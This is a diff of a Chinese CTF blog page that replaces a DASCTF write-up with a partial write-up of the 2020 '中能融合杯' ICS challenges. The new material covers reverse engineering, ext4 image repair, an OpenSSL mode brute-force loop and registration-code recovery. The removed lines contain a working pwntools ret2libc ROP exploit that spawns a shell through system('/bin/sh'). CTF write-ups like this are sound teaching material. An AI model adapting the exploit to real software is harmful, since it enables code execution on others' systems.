@@ -15,7 +15,7 @@
   <meta name="description" content>
   <meta name="author" content="chumen77">
   <meta name="keywords" content>
-  <title>DASCTF安恒月赛(4th) ~ Chumen77&#39;s Blog</title>
+  <title>2020 “中能融合杯” 部分wp ~ Chumen77&#39;s Blog</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
@@ -112,7 +112,7 @@
               
                 <p class="mt-3">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期六, 四月 25日 2020, 9:48 晚上
+                  星期六, 九月 12日 2020, 5:15 下午
                 </p>
               
 
@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    567 字
+                    1.1k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      3 分钟
+                      5 分钟
                   </span>&nbsp;
                 
 
@@ -162,84 +162,125 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h1 id="DASCTF安恒月赛-pwn"><a href="#DASCTF安恒月赛-pwn" class="headerlink" title="DASCTF安恒月赛-pwn"></a>DASCTF安恒月赛-pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开赛了，有点事情没打，晚上复现了一下。</p>
-<h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><pre><code class="python">[*] &#39;/ctf/work/ahys/echo server/test&#39;
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)</code></pre>
-<p>程序很简单，经典栈溢出，rop利用即可。<br>但是因为是64位的，并且是glibc2.27，发现在做的时候构造rop链总是会cursh，<br>调试发现：<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>发现这段汇编直接会让程序cursh，想起来ex师傅一篇文章分析过，64位程序rop到system拿shell的时候也会这样。但是很奇怪这个也出现了，索性尝试一波。<br>解决办法：还是加个ret，让栈对其即可。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
-local_file  = &#39;./test&#39;
-local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;
-remote_libc = &#39;./libc.so.6&#39;
-debug = 1
-if debug:
-    io = process(local_file)
-    libc = ELF(local_libc)
-else:
-    # io = remote(&#39;node3.buuoj.cn&#39;,25390)
-    libc = ELF(remote_libc)
+            <h1 id="工控wp"><a href="#工控wp" class="headerlink" title="工控wp"></a>工控wp</h1><h2 id="ICS-8"><a href="#ICS-8" class="headerlink" title="ICS_8"></a><code>ICS_8</code></h2><p>就是一个算法的逆向。</p>
+<pre><code class="python">#!/usr/bin/env python2.7
+import struct
+import base64
 
-elf = ELF(local_file)
-libc = elf.libc
-context.log_level = &#39;debug&#39;
-context.arch = elf.arch
-context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;
+cypher_text = &#39;HgoAVxEfdCRlPytBA1JSHiVOZW4VMURPcANETw==&#39;
+iv = struct.unpack(&quot;I&quot;, &#39;x1a0&#39;)[0]
+def decode(cypher_text,iv):
+    cypher_text = base64.b64decode(cypher_text)
+    padding = 4 - len(cypher_text) % 4
+    if padding != 0:
+        cypher_text = cypher_text + &quot;\x00&quot; * padding
 
-s      = lambda data               :io.send(data) 
-sa      = lambda delim,data         :io.sendafter(delim, data)
-sl      = lambda data               :io.sendline(data)
-sla     = lambda delim,data         :io.sendlineafter(delim, data)
-sea     = lambda delim,data         :io.sendafter(delim, data)
-r      = lambda numb=4096          :io.recv(numb)
-ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
-uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
-uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
-info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))
-itr     = lambda                    :io.interactive()
-def dbg():
-    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)
-    gdb.attach(io)
-    pause()
-pop_rdi = 0x0000000000400823# : pop rdi ; ret
-offset = 136
-start = 0x4005C0
-ret = 0x0400768
-sla(&#39;how long is your name:&#39;,&#39;500&#39;)
-payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,elf.got[&#39;read&#39;],elf.plt[&#39;printf&#39;],start])
-# dbg()
-sla(&#39;s you name?&#39;,payload)
-ru(&#39;hello &#39;)
-read = uu64(r(6))
-info_addr(&#39;printf&#39;,read)
-libc_base = read - libc.symbols[&#39;read&#39;]
-info_addr(&#39;libc_base&#39;,libc_base)
-binsh = libc_base  + libc.search(&quot;/bin/sh&quot;).next()
-system = libc_base + libc.sym[&#39;system&#39;]
-sla(&#39;how long is your name: &#39;,&#39;500&#39;)
-payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,binsh,system])
-# rec = 0x4f322 + libc_base
-# dbg()
-sla(&#39;s you name?&#39;,payload)
-itr()</code></pre>
-<h2 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h2><pre><code class="python">s = &#39;akhb~chdaZrdaZudqduvdZvvv|&#39;
+    l = cypher_text
+    crypher = struct.unpack(&quot;I&quot;*(len(l)/4),l)
+    datas = []
+    datas += [ decrypto(crypher[0]) ^ iv ]
+    for i in range(1,len(crypher)):
+        datas += [decrypto(crypher[i]) ^ crypher[i-1]]
+    return datas
+
+def decrypto(data):
+    return data ^ (data &gt;&gt; 16)
+
+datas = decode(cypher_text,iv)
+flag = &quot;&quot;
+for i in datas:
+    flag += struct.pack(&quot;I&quot;,i)
+print flag</code></pre>
+<h2 id="ICS-9"><a href="#ICS-9" class="headerlink" title="ICS_9"></a><code>ICS_9</code></h2><p>解压以后是一个img，但是发现是损坏的。</p>
+<pre><code class="bash">file ./ICS_9.img
+./ICS_9.img: Linux rev 1.0 ext4 filesystem data, UUID=1385df22-b2ce-4b4f-858e-79ae1932ca1a (extents) (huge files)</code></pre>
+<p>可以看到是ext4的文件。<br>然后可以用fsck修复一下：</p>
+<pre><code class="bash"> fsck.ext4 ./ICS_9.img
+e2fsck 1.42.13 (17-May-2015)
+ext2fs_open2: The ext2 superblock is corrupt
+fsck.ext4: Superblock invalid, trying backup blocks...
+./ICS_9.img was not cleanly unmounted, check forced.
+Pass 1: Checking inodes, blocks, and sizes
+Pass 2: Checking directory structure
+Pass 3: Checking directory connectivity
+Pass 4: Checking reference counts
+Pass 5: Checking group summary information
+Free blocks count wrong for group #0 (6789, counted=488).
+Fix&lt;y&gt;? yes
+Free blocks count wrong for group #1 (2006, counted=228).
+Fix&lt;y&gt;? yes
+Free blocks count wrong (8795, counted=716).
+Fix&lt;y&gt;? yes
+Free inodes count wrong for group #0 (1269, counted=1262).
+Fix&lt;y&gt;? yes
+Free inodes count wrong (2549, counted=2542).
+Fix&lt;y&gt;? yes
+
+./ICS_9.img: ***** FILE SYSTEM WAS MODIFIED *****
+./ICS_9.img: 18/2560 files (11.1% non-contiguous), 9524/10240 blocks
+</code></pre>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/kfnyiY.png" srcset="/img/loading.gif" alt></p>
+<p>然后进行挂载:</p>
+<pre><code class="bash">mkdir tmp2
+sudo mount ICS_9.img tmp2 ; ls -larth tmp2</code></pre>
+<pre><code class="bash"> binwalk fil.enc
+Scan Time:     2015-03-09 15:35:08
+Target File:   /tmp/wu/tmp/fil.enc
+MD5 Checksum:  cb84f2cc7d776e83ebe0bd17efa163f4
+Signatures:    328
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             OpenSSL encryption, salted, salt: 0x-6BC6193B4330E12E
+
+cat AE5
+4[71A3j9[\22?/+u0</code></pre>
+<p>Binwalk 一下，发现enc文件是openssl加密的文件，AE5文件是关于加密算法和密钥。</p>
+<p>但是并不知道是哪种模式的加密和密钥的长度的加密，需要写一个脚本测试。<br>这是所有的可能：</p>
+<pre><code class="bash">-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192   </code></pre>
+<pre><code class="bash">#!/bin/bash  
+ KEY=`cat AE5`  
+ AES=&quot;-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192&quot;  
+ for mode in $AES  
+ do  
+      openssl enc -d -in fil.enc -out ./tmp3/fil&quot;$mode&quot;.dec -k $KEY $mode  
+ done  </code></pre>
+<pre><code class="bash">sudo chmod +x ./1.sh
+sudo sh 1.sh</code></pre>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/X2q45Z.png" srcset="/img/loading.gif" alt></p>
+<h2 id="ICS-11"><a href="#ICS-11" class="headerlink" title="ICS_11"></a><code>ICS_11</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/UypJgM.png" srcset="/img/loading.gif" alt><br>程序上来就告诉一下flag的格式，其中字符的内容是20位。<br><img src="http://qiqianyun.chumen77.xyz/uPic/SzWq5u.png" srcset="/img/loading.gif" alt><br>向下走，也会发现有20的相关判断。<br>其上方有个大小判断大于10就退出了，但是flag是20位的，明显需要patch一下：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/6BsYEl.png" srcset="/img/loading.gif" alt></p>
+<p>然后往下分析，发现你输入的东西会跟12位的<code>nemo_pwned_n</code>进行先比较一下，<br>接着:</p>
+<pre><code class="bash"> if ( v17 + v18 != 2842152358 || v18 - v17 != 989791556 )</code></pre>
+<p>明显这是都需要进行满足的。<br>然后求解一下：</p>
+<pre><code class="bash">In [6]: hex(926180401)
+Out[6]: &#39;0x37346431&#39; (v17)
+
+In [7]: hex(1915971957)
+Out[7]: &#39;0x72336975&#39;. (v18)
+</code></pre>
+<p>这样大数据进行判断，其实也是判断字符的，转码一下：</p>
+<p><code>0x37346431:74d1  0x72336975 :r3iu</code><br>但是因为在内存中，其是小端序的，需要反转一下。<br>猜测flag就是<code>nemo_pwned_n1d47ui3r</code>。其长度正好就是20位。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/mDsH7W.png" srcset="/img/loading.gif" alt><br>经过验证的确是的。</p>
+<h2 id="ICS-13"><a href="#ICS-13" class="headerlink" title="ICS_13"></a><code>ICS_13</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/gvE3nU.png" srcset="/img/loading.gif" alt><br>十分简单，自己输入的东西减去0x14，和<code>10445678951</code>进行一个个字节的比较，相等就ok。</p>
+<pre><code class="bash">key = &#39;10445678951&#39;
+key = [ord(c) for c in key]
 flag = &#39;&#39;
-for i in range(26):
-    flag += chr((ord(s[i]) - 1) ^ 6)
+for i in key :
+    flag += chr(i+0x14)
 
 print(flag)</code></pre>
-<h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>直接爆破了。</p>
-<pre><code class="python">s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61]
-
-for i in range(128):
-    flag = &#39;&#39;
-    for j in range(38):
-        flag += chr(s[j] ^ i)
-    if flag[:4] == &#39;flag&#39;:
-        print(flag)
-</code></pre>
+<h2 id="ICS-2"><a href="#ICS-2" class="headerlink" title="ICS_2"></a><code>ICS_2</code></h2><p>先脱壳，esp定律脱壳。也可以用万能脱壳机进行脱。<br>由于给了提示，是需要找一个ip。很简单的思路就是直接找可疑ip。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/OjHdLY.png" srcset="/img/loading.gif" alt></p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/Y2gpgp.png" srcset="/img/loading.gif" alt></p>
+<p>x32dbg直接断在这里，向下跟。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/2Nsxbj.png" srcset="/img/loading.gif" alt><br>发现可疑ip，提交就对了。</p>
+<h2 id="ICS-14"><a href="#ICS-14" class="headerlink" title="ICS_14"></a><code>ICS_14</code></h2><p>程序就是很简单找到注册码。<br>邮箱可以乱输入，但是要保证<code>@</code> + <code>xx</code> + <code>.</code> + <code>xx</code></p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/f3gbCC.png" srcset="/img/loading.gif" alt><br>这里有函数进行控制判断。<br>如果不对就会说，邮箱不合法。<br>接着看流程：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/UDpOQ0.png" srcset="/img/loading.gif" alt></p>
+<p>这块在判断一堆东西，推测就是注册码。<br>往上一看，可以看到这一条。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/zigrXA.png" srcset="/img/loading.gif" alt><br>明显是ida无法识别，其是还是一个字符串。</p>
+<p>然后就是一个个转字符串，以v12-v27整合一下,<code>BZ9dmq4c8g9G7bAY</code>出来这个。<br>并且可以看到判断就是16位。<br>然后进行输入判断:<br><img src="http://qiqianyun.chumen77.xyz/uPic/8zufHQ.png" srcset="/img/loading.gif" alt><br>就很简单成功拿到。</p>
 
             <hr>
           </div>
@@ -253,11 +294,7 @@ for i in range(128):
                 
                   <a class="hover-with-bg" href="/tags/re">re</a>
                 
-                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
-                
-                  <a class="hover-with-bg" href="/tags/rop">rop</a>
-                
-                  <a class="hover-with-bg" href="/tags/uaf">uaf</a>
+                  <a class="hover-with-bg" href="/tags/misc">misc</a>
                 
               </span>
             
@@ -413,7 +450,7 @@ for i in range(128):
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "DASCTF安恒月赛(4th)&nbsp;",
+        "2020 “中能融合杯” 部分wp&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
